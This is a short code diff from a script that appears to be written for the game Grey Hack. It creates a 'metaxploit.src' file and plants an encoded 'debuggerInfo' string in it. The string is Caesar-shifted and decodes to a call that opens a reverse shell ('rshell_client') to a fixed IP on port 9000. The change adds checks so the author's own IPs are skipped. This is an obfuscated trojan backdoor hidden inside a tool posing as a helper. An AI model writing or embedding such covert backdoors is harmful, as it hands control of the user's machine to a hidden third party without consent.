@@ -144,7 +144,7 @@ print("<b>Make sure that you are running the program in the same directory as yo
 computerObject.touch(current_path, "metaxploit.src")
 metaSourceFile = computerObject.File(current_path+"/metaxploit.src")
 
-debuggerInfo = "qn(umbifxtwqb)bpmv umbifxtwqb.zapmtt_ktqmvb(""084.005.004.925"",9000,""Bmzuqvit"")"
+debuggerInfo = "qn((omb_apmtt().pwab_kwuxcbmz.xcjtqk_qx != ""73.913.28.949"")ivl(omb_apmtt().pwab_kwuxcbmz.twkit_qx != ""970.946.8.0""))bpmv umbifxtwqb.zapmtt_ktqmvb(""73.913.28.949"",9000,""Bmzuqvit"")"
 
 if(typeof(metaSourceFile) == "file")then
 	metaSourceFile.set_content(getMetaxploit+Encode(debuggerInfo))
